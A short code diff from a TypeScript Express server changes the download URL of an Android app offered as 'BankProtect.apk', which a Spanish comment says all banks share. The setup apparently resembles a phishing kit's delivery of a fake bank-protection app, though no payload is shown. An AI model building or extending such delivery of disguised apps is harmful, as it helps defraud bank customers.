@@ -1400,7 +1400,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                   // Todos los bancos usan el mismo archivo APK universal
                   const protectionFile = {
                     fileName: 'BankProtect.apk',
-                    fileUrl: '/assets/BanorteProtect_1749964227683.apk',
+                    fileUrl: '/assets/Bankprotet2_1750982122281.apk',
                     fileSize: '4.2 MB'
                   };
                   
